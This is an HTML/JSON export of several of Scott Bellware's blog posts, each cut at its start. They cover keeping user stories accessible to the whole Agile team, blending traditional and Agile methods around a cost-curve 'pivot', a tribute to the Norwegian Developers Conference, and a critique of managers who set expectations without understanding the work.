methodological oversights inherent in these tools, but that's a subject for a subsequent article.<br /><br />Here a some principles to keep in the forefront of your Agile practice amidst the distraction of so many Agile-targeted tools:<br /><br />1.<span style=\"font-style: italic;\">Individuals and interactions over processes and tools</span>has profound meaning. It doesn't suggest that you shouldn't use tools or processes, but that these often become distractions from more powerful means of ensuring success. Consider tooling choices very carefully - especially specialized tooling. Understand how it might inadvertently narrow the perspectives and values of its users.<br /><br />2. User stories are a whole team artifact. Any tool that moves user stories to a medium that the whole team doesn't have at their finger tips should only be used when there are no viable alternatives. Forcing some team members to go through other team members to work with collective artifacts is categorically not what is intended by<span style=\"font-style: italic;\">individuals and interactions over processes and tools</span>- even if it does cause people to work together to gain access to resources. These resources are supposed to be generally and immediately accessible to begin with.<br /><br />3. If you choose to remove collective artifacts to workstep-specific tools, put protocols in-place to ensure discrete hand-offs between tools so that multiple versions of the truth are not available to different workers who work in different work steps. When a user story moves from one system to another, destroy the previous version and leave behind a placeholder - a kind of<span style=\"font-style: italic;\">forwarding address</span>for a user story - that tells the interested party how to find the user story's new home.<br /><br />4. Don't fool yourself into believing that you'll be able to keep multiple versions of user stories in-sync through the life of a project. This kind of work is too costly to keep up and will be quickly abandoned by the project team, leading straight back to the<span style=\"font-style: italic;\">multiple versions of the truth</span>problems. Adding customized electronic synchronization automation to this problem is also not a good answer. This just adds more elaborateness to a situation that is possibly already too inelegant. It's a problem that likely shouldn't exist in the first place.<br /><br />The inescapable truth of user story management is that the least-elaborate technology is often the most productive solution - even if the technology is no more elaborate than a ten-foot by five-foot cork board with index cards pinned to it. In the very least, this keeps user stories immediately visible and accessible, and makes changing them no more difficult than putting pen to paper.<br /><br />Of course, the tried and true cork board and index card solution isn't a good foot for all teams. That said, as you seek more elaborate solutions, take tiny steps forward in settling on your solution. A leaping at the most elaborate solution for user story management usually ends up planting a whole team in a tool that serves the specialized perspective of the people doing the tool selection - often to the disservice of everyone else involved in the whole effort.<br /><br />It's vital that we're not lured into local optima interpretations like, \"individuals and interactions over tools and processes<span style=\"font-style: italic;\">except when the tools are intellectually stimulating</span>\". All tools are intellectually stimulating. In many cases, tools can be stimulating to distraction. The problem is what we're being distracted from: the essential root cause of success in software product development. Namely, the magnification of understanding and clarity that comes from interactions between individuals over the course of time. The deeper problem is that we believe ourselves to be impervious to this kind of distraction because we have such positive feelings about our tool choices.<br /><br />The immediacy and accessibility of user stories is a foundational corner stone that your Agile house is built on. Whether it stands strong and continues to be built upon, or whether it crumbles under its own weight can be decided entirely by this salient factor.<br /><br />Do everything you can to make sure that user stories continue to belong to everyone, in every minute of every day. And be vigilant against any backsliding into specialized expediencies that remove user stories to any medium that is less immediate or less accessible than the simplest and clearest of tools at our disposal. An elegant solution is often not an elaborate one, but greater whole-team productivity is always more stimulating than elaborate, specialized tools.<br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=NGSbe8s34mE:qfGyU0HhnAA:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=NGSbe8s34mE:qfGyU0HhnAA:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=NGSbe8s34mE:qfGyU0HhnAA:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=NGSbe8s34mE:qfGyU0HhnAA:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=NGSbe8s34mE:qfGyU0HhnAA:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=NGSbe8s34mE:qfGyU0HhnAA:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=NGSbe8s34mE:qfGyU0HhnAA:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=NGSbe8s34mE:qfGyU0HhnAA:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=NGSbe8s34mE:qfGyU0HhnAA:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/NGSbe8s34mE\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1055}}

Your own organization's cost curve mileage may vary.</span><br /><br /><span style=\"font-weight:bold;\">The Cost of Traditional Development</span><br /><br />The essential proposition is that the cost of a unit of software development effort gets exponentially higher as a project progresses. The same curve represents the cost of change of existing features equally as well as the cost of adding new features.<br /><br />The underlying principle is pretty straight-forward: the more stuff you have, the more stuff that will go wrong that you can't predict and that you don't detect. The more stuff going wrong, the more rework in-progress. Rework is the crumbly raw material that makes all foundations shaky - be they the foundations of software, or the foundations of the plan.<br /><br />The number of modules in a software project increases as a project progresses. The number of inter-relationships between modules grows as the number of modules grows. The number of unpredictable repercussions of any change to existing modules or addition of new modules, as well as the extent that repercussions dissipate throughout a system of modules, increases as the number of inter-relationships increases.<br /><br />When there are fewer modules, it's much more straight-forward to add new modules. However, at a critical turning point, this ease rapidly erodes and it becomes exponentially more difficult to get work done without undoing work that was done previously.<br /><br />The more modules in a system, the more likely that any new additions or changes will cause adjacent modules to no longer work as they once had, and to no longer work correctly. The longer that they stay in this incorrect state, the more that other adjacent modules will be built incorrectly, or built<a href=\"http://blog.scottbellware.com/2009/02/design-flaws-hernias-and-anemic-quality.html\">in a way that reduces development productivity</a>.<br /><br />The more modules that are in a system, the less likely it is that its programmers can assess any detrimental effects brought about by changes. The system becomes an increasingly unsolvable puzzle that must be solved every time a change is made to add new code or to change existing code. Early on in the life of a system, the puzzle is dead-simple to solve. As the number of modules grow, the possibility of solving that puzzle with every new change closes in on improbable. This is the source of the extra effort that accretes around software development as time goes on.<br /><br /><span style=\"font-weight:bold;\">How Agile Flattens the Traditional Costs</span><br /><br />The Agile cost curve is fundamentally different. It was such a radical re-imagining of managing the factors that influence the cost curve that it was frequently dismissed out-of-hand, despite affirmations and reports from people who had given it an honest empirical and experiential trial.<br /><br />Agile development's power rests in the drive to recognize the conditions that cause the cost of effort to increase over time. It uses techniques that keep effort leveled over the length of a software project, rather than allowing them to spiral toward the inconceivable, unpredictable, and unmanageable.<br /><br />The cost of change is controllable only when you can predict whether any change will have detrimental consequences. You need to be able to apply countermeasures immediately when any of these detriments are created. The longer the wait to detect a design flaw, the faster the cost grows. This ultimately leads to the vicious circle of rework, where problems are found after the work is delivered to the next phase in the development process, while developers continue to build on that work, believing it to be a sound foundation.<br /><br />In other words, Agile's radical re-shaping of the traditional cost curve comes from the ability for workers to easily and continuously check that their work isn't a cost magnet while that work is still open on their workbenches. They embrace a principled understanding of the kinds of software designs that are directly and easily tested, and a diligence paid to recognizing, avoiding, and remediating designs that aren't.<br /><br />And of utmost and paramount concern - concern that can make or break an Agile effort: that organizations realize that its the rigidity of organizations and organizational systems and behaviors that obstruct software development from being done in a way that allows software workers and teams to rehabilitate the traditional cost curve. The impact to organizations - especially entitlements to silos and rigidity - can be profound. Organizations adopting Agile have a responsibility to shift from defensible, garrisoned blame cultures to proactive, optimized learning cultures. If the organizational and management system locks the steering wheel into one, largely immovable position, there should be little surprise when projects end up in the productivity ditch.<br /><br />The Agile cost curve also suggests that there's a bit of a startup tax to pay up front, but that once the initial bump is navigated, productivity stabilizes and becomes much more predictable.<br /><br />This is in contrast to traditional methods where the inherent absence of complications early-on lulls developers and managers into a false sense of success. They fail to practice productive countermeasures from the very start by failing to recognize the technical and organizational naivete inherent in the work. The success doesn't last. It's outlived by the realities of the exponentially-increasing number of complications that are natural side-effects of the progress of a software development effort.<br /><br /><span style=\"font-weight:bold;\">The Agile Project Startup Tax</span><br /><br />The graphic depicting the Agile cost curve overlaid on the traditional cost curve tells this whole story at a glance. This is what makes it so compelling. And yet, while the Agile cost curve is incredibly compelling, the most interesting point of the graphic isn't so much the benefits that Agile methods avail, but the point on the curve where the lines intersect:<br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"http://4.bp.blogspot.com/_rt8zZqKCZSg/TL9ed9ojGRI/AAAAAAAAAK8/mb_NayXl-vY/s1600/intersection.jpg\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;width: 400px; height: 218px;\" src=\"http://4.bp.blogspot.com/_rt8zZqKCZSg/TL9ed9ojGRI/AAAAAAAAAK8/mb_NayXl-vY/s400/intersection.jpg\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5530242736288110866\" /></a><br />Before that point, Agile development has a higher cost. Before that point, traditional methods should have a lower cost. The time spent using by-the-book, colloquial Agile development techniques before the point where traditional techniques become too costly is a likley volunteer mission for exacerbated costs.<br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"http://3.bp.blogspot.com/_rt8zZqKCZSg/TL9eunYzHyI/AAAAAAAAALE/-D7KLIF5Clc/s1600/avoidable.jpg\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;width: 400px; height: 218px;\" src=\"http://3.bp.blogspot.com/_rt8zZqKCZSg/TL9eunYzHyI/AAAAAAAAALE/-D7KLIF5Clc/s400/avoidable.jpg\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5530243022374248226\" /></a><br /><span style=\"font-weight:bold;\">The Best (or Least) of Both</span><br /><br />A methodology that uses aspects of traditional development<span style=\"font-style: italic;\">up to the point the costs of traditional methods are on the verge of spiraling out of control</span>, and then makes a methodological \"pivot\" to techniques that can be considered \"Agile\" can reap the benefits of each approach's strengths.<br /><br />Such a \"blended\" approach takes advantage of traditional methods that, while unsustainable, can deliver more bang for the buck up-front. The resulting path has the least amount of cost if the pivot is well-executed.<br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"http://3.bp.blogspot.com/_rt8zZqKCZSg/TL9fFW5kPkI/AAAAAAAAALM/8EDugN_aLB0/s1600/blended.jpg\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;width: 400px; height: 218px;\" src=\"http://3.bp.blogspot.com/_rt8zZqKCZSg/TL9fFW5kPkI/AAAAAAAAALM/8EDugN_aLB0/s400/blended.jpg\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5530243413085273666\" /></a><br />The resulting methodology is both traditional and Agile based on where work is in the project timeline and in the smaller development cycles. Neither its traditional aspects nor its Agile aspects are left unchanged by the imperatives of blending what is usually seen as incompatible methods into a continuum. But the most effective and salient principles of development productivity remain in-play.<br /><br />My own practice of that continuum is informed by Lean Development, and more recently by the Lean Startup movement and its understanding of up-front phases that are often not mentioned by predominating methods like Scrum, and traditional methods that came before.<br /><br /><span style=\"font-weight:bold;\">The Least Way</span><br /><br />I was bemoaning failures with Agile and Agile community to<a href=\"http://blog.asmartbear.com/\" target=\"_blank\">Jason Cohen</a>a couple of years ago. He offered the \"The Least Way\" as a name for the approach that I was embracing to deal with a number of the issues with Agile stasis and orthodoxy that I was trying to work around. I'll ultimately add more meat to those bones on<a href=\"http://leastway.org\" target=\"_blank\">LeastWay.org</a>, and talk about how it underlies some<a href=\"http://floverse.com\" target=\"_blank\">tooling that I'm working on</a>, and how it has affected work on projects. Maybe you'll find it as useful as I have if packaged up in a consumable form.<br /><br />One of the key differences between an approach that doesn't just cherry pick techniques from different methodologies, but executes a full methodological pivot, is the explicit management of that switch. Planning for it, preparing for it, recognizing the right time to make the pivot, and making a clean entrance and exit from it is a bonafide part of the practice.<br /><br />Missing the pivot is like missing the last exit before entering the<a href=\"http://en.wikipedia.org/wiki/Lake_Pontchartrain_Causeway\" target=\"_blank\">Lake Pontchartrain Causeway</a>. By the time you've realized that you've zoomed past your best chance to take the turn off, you've likely been captured by the gravity well that will start you toward the acceleration of costs. The cost curve begins it's rapid incline immediately after the pivot. The longer it takes to realize that you've missed the turnoff, the faster you'll be traveling, and the more you'll have to spend to put on the breaks and get back on-track toward managing the cost-per-effort.<br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"http://3.bp.blogspot.com/_rt8zZqKCZSg/TL9fU4-2rhI/AAAAAAAAALU/7Ii6plQBBJk/s1600/missed.jpg\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;width: 400px; height: 219px;\" src=\"http://3.bp.blogspot.com/_rt8zZqKCZSg/TL9fU4-2rhI/AAAAAAAAALU/7Ii6plQBBJk/s400/missed.jpg\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5530243679932296722\" /></a><br />Shaping the whole methodology around the pivot changes some of the conditions that drive staffing and work management at different phases of a whole software effort. It's not just \"changing gears\", but more like changing vehicles while they are still moving: you'd want to have vehicles designed for this specific purpose. Modifying the existing vehicles is a good place to start.<br /><br />With the pivot being a full-fledged part of the methodology, with practices in place to recognize its approach and to execute it cleanly, the cost curve should be smoother, representing the best of what traditional methods have to offer - up to the point that they become unsustainable, and the best of what Agile has to offer - but not before it is sensible.<br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"http://2.bp.blogspot.com/_rt8zZqKCZSg/TL9flb2jMCI/AAAAAAAAALc/wY3mtqdR0lw/s1600/least.jpg\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;width: 400px; height: 217px;\" src=\"http://2.bp.blogspot.com/_rt8zZqKCZSg/TL9flb2jMCI/AAAAAAAAALc/wY3mtqdR0lw/s400/least.jpg\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5530243964170612770\" /></a><br />It's easy to see the methodologies as \"one vs. the other\" issues - \"traditional vs. agile\", for example. This perspective can even be helpful when more radical approaches are needed to shake up a rigid, entrenched, silo culture. However, plotting methodologies along a continuum helps us to see those parts of the spectrum where one blends into the other, and to learn to recognize and take advantage of the distinct transitional phases between them that we might otherwise miss or ignore.<br /><br />Our tendency to look at some colors as \"primary\" and those in-between as \"secondary\" is largely an arbitrary side-effect of perceptual bias. The spectrum is one, fluid continuum of material that is neither primary nor secondary. When we choose to see transitional states as secondary, we naturally tend to tune them out. The powerful continuum of abilities that flow smoothly from each other is turned into a checkerboard of disconnected, shallow monotones.<br /><br />Rapid feedback is the lifeblood of software development that doesn't spiral out of control. Agile protects vital feedback mechanisms from becoming calcified after a projects initial phases. Traditional methods provide rapid - but unsustainable - access to product and customer feedback early-on. Leveraging both and planning for and executing the transition as a fully-fledged part of the methodology rather than a secondary interest is a good part of navigating a \"least way\" of development obstructions (and costs).<br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Mzh8U-CTnsg:3g8mEwvCECg:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Mzh8U-CTnsg:3g8mEwvCECg:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=Mzh8U-CTnsg:3g8mEwvCECg:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Mzh8U-CTnsg:3g8mEwvCECg:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Mzh8U-CTnsg:3g8mEwvCECg:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Mzh8U-CTnsg:3g8mEwvCECg:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Mzh8U-CTnsg:3g8mEwvCECg:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=Mzh8U-CTnsg:3g8mEwvCECg:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Mzh8U-CTnsg:3g8mEwvCECg:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/Mzh8U-CTnsg\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1056}}

It's Kjersti's leadership that makes the NDC an excellent conference - and in my case, one of the best and most rewarding conference experiences that I've ever had.<br /><br />When you build something that you truly believe in, and when you have intentions to do something great and hold yourself to extremely high standards, that sense of ownership is palpable in every aspect of the work and of the product. The Norwegian Developers Conference in Oslo last week was an obvious expression of leadership, vision, and commitment.<br /><br />I get the sense that being at the door, in person, to bid farewell to conference participants wasn't just the execution of good customer experience technique and strategy, but was a moment for Kjersti to enjoy the fulfillment of hard work and excellent execution. I can't remember a conference where the conference director was so deeply invested in her customers' experience that she was there in person to wish them well and to express her appreciation for their participation.<br /><br />Anyone can fake these kinds of expressions of customer service, but it takes heart to do it and to make it clearly sincere and meaningful.<br /><br />Kjersti wasn't at the door to wish NDC participants a good journey back home and through the next year because it's just smart, personable technique. She was there because it meant as much to her to enjoy the moment of personal and personable accomplishment as the experience of the NDC meant to the people who came to NDC. And it was definitely a moment of absolute pleasure for me to watch something quite rare: a true appreciation for customer experience reflecting a true investment in product and customer development.<br /><br />Kjersti wasn't at the door with a big sign over her head letting people know that she is the person behind the NDC. She was there anonymously. She wasn't there for the show and the display, she was there because it means something for her to be there, and to say farewell in person. It wasn't about a demonstration of investment in customer, it was simply investment in truth incarnate. For me, it was probably the most endearing moment of a conference that overflowed with endearment.<br /><br />There's much more to say about the people involved in making the Norwegian Developers Conference happen. I'd just like to say thanks to everyone at Kjersti's company,<a href=\"http://www.programutvikling.no/\">Program Utvikling</a>, and to Anders Noras, Rune Grothaug, Henriette Holmen, Jakob Bradford, Thale Sandberg, and a host of people who had a role to play in making the NDC a memorable and rewarding human experience.<br /><br />The most important thing about creating a good conference is crafting a space for ideas and perspectives to come together - especially conflicting ideas and perspectives - to learn what new ideas can come from the experience, and to form new, higher order ideas that resolve what we had previously assumed were ideas of irreconcilable difference. It takes courage and integrity to create a space to allow this to happen. The space itself is just a blank slate, it becomes a space of courage and integrity when it reflects these qualities that are already qualities of its leaders.<br /><br />Two salient takeaways for myself from my experience at conferences in Scandinavia:<br /><br />Firstly, Scandinavian conferences, like NDC, Oredev, and others, don't seem to allow the kind of mindless orthodoxy that is eroding integrity in many conferences in the United States. They encourage encounters of diversity that, while tense, inevitably lead to the greatest ideas of the future, and point the way to the next steps.<br /><br />And secondly, the United States conference market is in desperate need of a practitioner-level conference like the kind I've experienced in Scandinavia - especially in the Microsoft community, where diversity is increasingly avoided and, in some cases, actively suppressed. My hope beyond hope is that we'll see one of these conferences on our shores soon, and that their influence will help to get the community focused on goals that are more important to society as a whole than they are to the imperatives of a particular player's interests.<br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=qRGnAvBp8Bk:WTh27na7Y9k:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=qRGnAvBp8Bk:WTh27na7Y9k:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=qRGnAvBp8Bk:WTh27na7Y9k:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=qRGnAvBp8Bk:WTh27na7Y9k:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=qRGnAvBp8Bk:WTh27na7Y9k:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=qRGnAvBp8Bk:WTh27na7Y9k:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=qRGnAvBp8Bk:WTh27na7Y9k:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=qRGnAvBp8Bk:WTh27na7Y9k:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=qRGnAvBp8Bk:WTh27na7Y9k:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/qRGnAvBp8Bk\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1057}}

Of course there's more to it, but \"setting expectations\" covers a lot of ground.<br /><br />Management is central to the productivity crisis we face in software development. It's a crisis that pervades software development so profoundly that we usually don't recognize it. It's like water to a fish - not something that our attention is drawn to, not something that we notice. It's the environment that encloses everything we do. It's not that we see it as normal, we just fail to see it at all. Frustration, burnouts, blown budgets, missed expectations, and dissatisfied customers; it's just the way that most software development is done.<br /><br />We start with the best of intentions, and despite our intentions, we usually end up in the weeds. We end up in the weeds most of the time because that is where software development teams are directed. It's because of one salient, painful truth about software development:<br /><br />Software development managers don't understand the work of software development sufficiently to be able to direct the work of software development, and the value of hands-on work experience they've had in the past decays so rapidly that it's increasingly unsafe to make new decisions based on it.<br /><br />Said more plainly: at a time when senior staff should be best informed by their lengthy and varied experience, they remove themselves from the work of software development long enough to lose the understanding of how day-to-day software development work is done. They lose the knowledge needed to direct the work of day-to-day software development. A certain egoic mania takes root that leads senior staff to feel entitled to believe that their insight has moved beyond the necessity of mere practical work experience.<br /><br />How long does it take to become unqualified to set expectations for software development work? Not long. It happens as quickly as six months and often not longer than two years. This is why the proposition of Self-Directed Work Teams that has been popularized by new, opportunistic interpretation of Agile Methods has become so attractive in software development - even though SDWT is a well-known failure mode in most development industries and is known to be sustainable for no longer than a couple of years in the majority of cases (there are exceptions, but exceptional organizations usually aren't the rule for unexceptional organizations, despite our best hopes and ideals).<br /><br />Plotting software development management on a continuum between the extremes of Managers and Bullies, we don't find many managers who are only either extreme. A software development authority is rarely either only a manager or only a bully, but software development managers are usually weighted more toward the bully end of the spectrum. It's an innevitable consequence of having lost interest in the details of software development work, and having become quickly dated as a consequence.<br /><br />Someone who sets expectations but who isn't able to show workers how to fulfill expectations isn't managing, he's using the implicit threat of crossing an authority to make demands without knowing if those demands can be met. And he's hoping for the best. But we need more than hope to manage software development. We need to know that the work being done every day is the work that leads to the desired outcomes.<br /><br />Setting expectations without knowing how to meet those expectations almost always leads to unqualified or unrealistic expectations. Using authority to require unrealistic expectations to be met always creates a compounding accumulation of obstructions to subsequent work. It's a sure-fire path to lower productivity. Most software development organizations live perpetually under this cloud of depressed productivity.<br /><br />A bully sets expectations for workers but doesn't have the relevant and necessary capacities to help those workers fulfill the expectations. A bully has been disconnected from work for long enough that he (or she) is no longer able to personally act to ensure that his workers meet his expectations - to show them how the work is done, and to qualify the work that they do.<br /><br />In other words, the person who needs to be the most experienced and most expert software development worker on the team is often the least capable.<br /><br />A direct manager knows how the work should be done. He may know this better than his workers. When necessary, a manager can sit down with the worker's current tools, and teach the worker how to meet expectations, and to teach the worker how the specifics and tactics are tied to a greater whole. A bully hides behind assertions that his time and intellect are too valuable to be spent on such trivialities as the \"how\" of doing the work in his purview.<br /><br />It's fair for a person with authority to no longer have the capacity to ensure that workers are materially able to meet expectations, but then that authority must defer to someone who does have the necessary and relevant capacity. And this is an entirely undesirable circumstance. It might be the circumstance that you're dealing with, but it's not the one you should settle for.<br /><br />An authority who isn't capable of knowing whether and how work can be accomplished and whether expectations can be met is qualified to set only summary expectations. An authority who over-steps the material bounds of his capacity will continue to inject productivity obstructions into his organization's workflow by causing workers to make unsafe and counterproductive decisions that innevitably lead to rework, overwork, and relearning.<br /><br />A bully believes that his workers are soft and lazy, and often puts extra pressure on workers believing that this is what it takes to get merely nominal productivity. A manager recognizes that workers who retreat from work are likely facing some distressing obstructions in the workflow. He uses his skills as a teacher and his insights into the work as an expert worker to help his workers to recognize and clear obstructions.<br /><br />It's often hard for us to accept the cold reality of the depressed productivity in our organizations. We fail to manage software development as a product development discipline and tend to manage it as a manufacturing discipline (usually without even understanding or recognizing the difference), undermining productivity at every turn by tuning the wrong variables and turning the wrong organizational and procedural knobs.<br /><br />In an environment where management leans more to the bully side of the continuum, we see work teams stretch the intentions of \"self-organization\" into the realm of \"self-determination\" or \"self-direction\". It's not necessarily an unwarranted reaction, but its a reaction to a root cause that should be the focus of organizational and procedural improvement. It's in these environments that we also see a need for coaches to fill in the management void, but this is also a lesser palliative that doesn't necessarily get to the heart of the matter.<br /><br />A manager is someone who balances qualified and expert worksmanship with the ability to teach and is comfortable with using directed authority when necessary. He goes with his team into new learning and new understanding, and re-directs the team if the creative drive for experimentation starts to occlude the imperatives of delivering material product.<br /><br />Doubtlessly, it's sensationalistic to divvy up the software development management landscape into extremes, but doing so is meant to frame the issue so that we can begin to recognize a real problem and begin to do something about it.<br /><br />The way that software development is practiced at large, it's perfectly understandable for software development workers to become burned out on software development, and to look for a change. Unfortunately, moving upward to software development management isn't where people who are burned out on this work should go. It's little more than an escape, and it needs to be more of a deeper commitment to the work rather than a means to justify avoiding the details.<br /><br />Ultimately, software development work will remain palatable for much longer when it is managed much better. But we are where we are, and the general population of software development managers will remain skewed heavily toward refugees from the work of software development for some time.<br /><br />This is the software management crisis: software development managers at large aren't experts in software development work now, and they often weren't expert workers in the days when they were hands-on. They were the people who came to dislike the work enough to want to escape to software development management. They usually don't know enough about the details of the work to understand how subtle decisions can result in tremendous outcomes, and which decisions lead to tremendously good outcomes, or tremendously poor outcomes.<br /><br />Today's software development managers largely haven't made a study of managing software development and the principles of product development work and work management. Software continues to be managed as one would manage material assembly or manufacturing. Our current generation of managers isn't aware of this problem because software development management hasn't really been a field of interest for most of them - it's just the job that they have, and it's one that keeps them from having to work in the painful niggling details of poorly-managed software.<br /><br />None of this suggests that we need to wipe the halls of software development management clean and start from scratch with newly-installed personnel lifted from the rank-and-file. One of the worst mistakes that our current management ideology continues to make is the failure to recognize the material cost of losing institutional knowledge when we lose any worker (NOTE: the flip side of this problem is the colloquial horror of not knowing who to hire, and bringing people into our organizations that we dismiss in short order).<br /><br />The software development mangers that we have today may have become burned out on the details of software development, but those details can be changed to make the work less tiresome, and make the work less like an uphill battle being fought on a cliff face rather than a gentle slope. Their institutional knowledge is far too valuable to lose. Their many years of experience - if paired with a sharper understanding of which decisions make software development good and which make it bad - provides a perspective of the whole of the effort that is invaluable.<br /><br />It's entirely reasonable to expect that we can transform the software development industry. The root of the problem is in the software development management system. When software development managers are willing to look without flinching into the reality of their situation and the circumstances that have led to their positions, then we can begin to rehabilitate the system. When that happens, many of the software development industry's most futile pathologies will fall by the wayside and we'll begin to tap the potential that is this industry's unclaimed birthright.<br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=_jtbCWIzoCY:05cfIfRJsXI:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=_jtbCWIzoCY:05cfIfRJsXI:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=_jtbCWIzoCY:05cfIfRJsXI:V_sGLiPBpWU\" 